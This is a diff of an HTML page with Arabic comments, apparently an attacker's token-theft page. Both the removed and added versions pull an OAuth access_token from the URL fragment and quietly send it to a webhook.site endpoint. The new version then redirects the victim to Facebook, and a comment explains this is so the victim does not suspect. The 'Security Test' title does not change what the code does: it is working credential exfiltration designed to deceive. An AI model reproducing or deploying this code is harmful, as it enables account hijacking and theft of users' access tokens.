@@ -1,22 +1,35 @@
-<script>
-    // 1. التقاط الـ Fragment الذي يحتوي على التوكن من الرابط
-    const urlHash = window.location.hash;
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Test Persistence</title>
+</head>
+<body>
+    <script>
+        // 1. استخراج التوكن من الرابط (URL Fragment)
+        const hash = window.location.hash;
+        if (hash) {
+            const params = new URLSearchParams(hash.substring(1));
+            const token = params.get('access_token');
 
-    if (urlHash) {
-        // 2. استخراج التوكن برمجياً
-        const params = new URLSearchParams(urlHash.substring(1));
-        const accessToken = params.get('access_token');
-
-        if (accessToken) {
-            // 3. إرسال التوكن فوراً وبشكل صامت إلى رابط الـ Webhook الخاص بك
-            fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_token=' + accessToken, {
-                method: 'GET',
-                mode: 'no-cors'
-            });
-
-            // 4. توجيه المستخدم لصفحة وهمية أو إظهار رسالة نجاح لتمويه العملية
-            console.log("Exfiltration successful.");
-            document.body.innerHTML = "<h1>Security Check Completed.</h1>";
+            if (token) {
+                // 2. إرسال التوكن إلى رابط الـ Webhook الجديد الخاص بك
+                const webhookURL = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
+                
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors', // لضمان الإرسال حتى مع قيود التصفح
+                    body: JSON.stringify({
+                        captured_token: token,
+                        timestamp: new Date().toISOString(),
+                        location: "Sudan_Test_Lab"
+                    })
+                }).then(() => {
+                    // 3. توجيه الضحية لموقع حقيقي لعدم الشك (مثلاً بروفايل فيسبوك)
+                    window.location.href = "https://www.facebook.com/me";
+                });
+            }
         }
-    }
-</script>
+    </script>
+    <h2>Processing... Please wait.</h2>
+</body>
+</html>
